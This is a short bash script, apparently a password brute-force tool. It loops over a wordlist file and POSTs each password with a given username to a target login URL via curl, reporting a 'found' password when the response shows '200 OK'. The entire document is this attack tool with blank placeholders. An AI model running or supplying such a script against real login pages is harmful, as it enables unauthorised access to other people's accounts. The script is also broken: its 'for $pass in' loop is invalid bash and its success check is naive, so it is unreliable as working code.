FILEPATH=""
USER=""
TARGET_URL=""

for $pass in $(cat $FILEPATH); do
  echo "Trying password: $pass"
  response=$(curl -i -s -X POST -d "username=$USER&password=$pass" $TARGET_URL)
  if echo $response | grep -q "200 OK"; then
    echo "[+] Password Found: $pass"
    break
  fi
done
